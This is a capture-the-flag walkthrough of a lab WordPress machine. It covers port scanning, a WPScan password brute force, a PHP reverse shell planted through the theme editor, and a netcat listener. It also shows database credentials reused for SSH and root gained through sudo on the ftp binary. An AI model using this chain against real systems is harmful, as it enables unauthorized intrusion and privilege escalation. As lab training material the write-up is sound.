## Nmap

```
sudo nmap 10.10.189.203 -p- -sS -sV

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

With only port 80 worth enumerating for the moment we can start here. The root page directs to the page below in which we can see is powered by Wordpress.

As we are dealing with Wordpress we can run WPScan against the target.

```
wpscan --url http://10.10.189.203 -t 40 -e ap,u1-1000 --passwords /usr/share/wordlists/rockyou.txt
```

Soon WPScan identifies multiple users and soon reports a successful login attempt as the user 'c0ldd'.

Heading over to /wp-admin we can then proceed to login with the credentials we have found.

From here we can attempt to gain a reverse shell by editing one of the pages. Ideally index.php. Head over to Appearence > Editor and on the right select Main Index. I then removed the original code and inserted a reverse shell which can be found here: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

After replacing the code and updating the file we can start a `netcat` listener on our attacking machine.

```
sudo nc -lvp 80
```

The browse to index.php on the main page. The page should hang and we should have a shell.

I then upgraded the shell to something nicer using the command below:

```
/usr/bin/script -qc /bin/bash /dev/null
```

Manually enumerating the machine we find the user c0ldd. Apart from a user flag nothing interesting was inside the home profile. We know that Wordpress is installed so we can check wp-config.php located at:

`/var/www/html/wp-config.php`

Viewing this file we come across some database information.

I then used the same credentials against SSH and was able to login as c0ldd. As SSH is running on port 4512 the `-p` switch was used to specify an alternate port.

```
ssh -p 4512 c0ldd@10.10.189.203 
```

Checking sudo with `sudo -l` shows we can run the following commands on the target machine as root.

Checking [GTFOBins](https://gtfobins.github.io/gtfobins/ftp/#sudo) against the FTP binary shows this can be used to gain a root shell.

```
sudo -u root /usr/bin/ftp
!/bin/sh
```
